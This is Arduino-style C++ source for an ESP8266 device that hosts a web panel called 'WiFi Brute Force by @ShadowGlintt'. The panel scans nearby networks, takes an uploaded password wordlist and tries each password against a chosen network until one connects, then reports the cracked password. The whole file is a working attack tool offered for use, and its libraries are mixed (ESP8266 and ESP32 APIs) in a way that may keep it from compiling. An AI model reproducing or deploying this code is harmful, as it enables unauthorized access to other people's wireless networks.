#include <ESP8266WiFi.h>
#include <WebServer.h>
#include <FS.h>
#include <SPIFFS.h>

// Access Point credentials
const char* apSSID = "ShadowGlint";
const char* apPassword = "12345678";

// Create a web server on port 80
WebServer server(80);

// Global variables for target network and wordlist
String targetSSID = "";
const char* wordlistPath = "/wordlist.txt";
bool bruteForceInProgress = false;

// To send real-time updates
WiFiClient sseClient;

void setup() {
  Serial.begin(115200);
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS mount failed!");
    return;
  }
  
  WiFi.softAP(apSSID, apPassword);
  IPAddress IP = WiFi.softAPIP();
  Serial.println("AP Started: " + String(apSSID) + " / " + String(apPassword));
  Serial.println("Web interface: http://" + IP.toString());

  setupServerRoutes();
  server.begin();
}

void loop() {
  server.handleClient();
  if (bruteForceInProgress && sseClient.connected()) {
    runBruteForce();
    bruteForceInProgress = false;
  }
}

void setupServerRoutes() {
  server.on("/", handleRoot);
  server.on("/scan", handleScanNetworks);
  server.on("/attack", handleAttackPage);
  server.on("/upload", HTTP_POST, []() { server.send(200); }, handleFileUpload);
  server.on("/start_attack", handleStartAttack);
  server.on("/progress", handleProgress);
}

void handleRoot() {
  server.send(200, "text/html", createHTML("WiFi Brute Force by @ShadowGlintt", 
    "<p><a href='/scan'>Scan Nearby Networks</a></p>"));
}

void handleScanNetworks() {
  int n = WiFi.scanNetworks();
  String content = "<h2>Nearby Networks</h2>";
  if (n == 0) {
    content += "<p>No networks found!</p>";
  } else {
    content += "<form action='/attack' method='GET'>";
    for (int i = 0; i < n; ++i) {
      content += "<input type='radio' name='ssid' value='" + WiFi.SSID(i) + "'> " 
               + WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + " dBm)<br>";
    }
    content += "<input type='submit' value='Select Network'></form>";
  }
  server.send(200, "text/html", createHTML("@ShadowGlintt", content));
}

void handleAttackPage() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "No network selected!");
    return;
  }
  
  targetSSID = server.arg("ssid");
  
  String content = "<h2>Target: " + targetSSID + "</h2>"
                   "<form action='/upload' method='POST' enctype='multipart/form-data'>"
                   "<input type='file' name='wordlist'><br>"
                   "<input type='submit' value='Upload Wordlist'>"
                   "</form>";
                   
  server.send(200, "text/html", createHTML(" @ShadowGlintt", content));
}

void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  
  if (upload.status == UPLOAD_FILE_START) {
    SPIFFS.remove(wordlistPath);
    File file = SPIFFS.open(wordlistPath, FILE_WRITE);
    
    if (!file) {
      server.send(500, "text/plain", "File creation failed");
      return;
    }
    
    file.close();
    
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File file = SPIFFS.open(wordlistPath, FILE_APPEND);
    
    if (file) {
      file.write(upload.buf, upload.currentSize);
      file.close();
    }
    
  } else if (upload.status == UPLOAD_FILE_END) {
    server.send(200, "text/html", createHTML("@ShadowGlintt", 
      "<p>File uploaded successfully!</p><a href='/start_attack'>Start Attack</a>"));
  }
}

void handleStartAttack() {
  if (targetSSID.isEmpty() || !SPIFFS.exists(wordlistPath)) {
    server.send(400, "text/plain", "Missing target or wordlist");
    return;
  }
  
  bruteForceInProgress = true;
  
  sseClient = server.client();
  
  server.sendContent(
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: text/event-stream\r\n"
    "Cache-Control: no-cache\r\n"
    "Connection: keep-alive\r\n\r\n"
  );
}

void handleProgress() {
  server.send(200, "text/plain", bruteForceInProgress ? "Attack in progress" : "No ongoing attack");
}

void runBruteForce() {
  File file = SPIFFS.open(wordlistPath, FILE_READ);
  
  if (!file) return;

  while (file.available()) {
    String password = file.readStringUntil('\n');
    password.trim();
    
    sseClient.print("data: Trying: " + password + "\n\n");
    sseClient.flush();

    WiFi.begin(targetSSID.c_str(), password.c_str());
    
    unsigned long startTime = millis();
    
    while (WiFi.status() != WL_CONNECTED && millis() - startTime < 5000) {
      delay(100);
    }

    if (WiFi.status() == WL_CONNECTED) {
      sseClient.print("data: Password Found: " + password + "\n\n");
      sseClient.flush();
      WiFi.disconnect();
      break;
    }
  }

  file.close();
  
  sseClient.print("data: Attack Complete\n\n");
  
  sseClient.stop();
}

String createHTML(String title, String content) {
  String html = "<!DOCTYPE html><html><head>"
                "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                "<title>" + title + "</title>"
                "<style>"
                "body{font-family:Arial,sans-serif;margin:0;padding:20px;text-align:center;background:#f0f0f0;}"
                "h1,h2{color:#333;}"
                "a{color:#0066cc;text-decoration:none;}"
                "a:hover{text-decoration:underline;}"
                "form{background:white;padding:20px;border-radius:8px;display:inline-block;}"
                "input[type='submit']{background:#0066cc;color:white;border:none;padding:10px 20px;cursor:pointer;}"
                "input[type='submit']:hover{background:#0052a3;}"
                "</style></head><body>"
                "<h1>" + title + "</h1>" + content + 
                "<p><a href='/'>Home</a></p>"
                "</body></html>";
                
   return html;
}
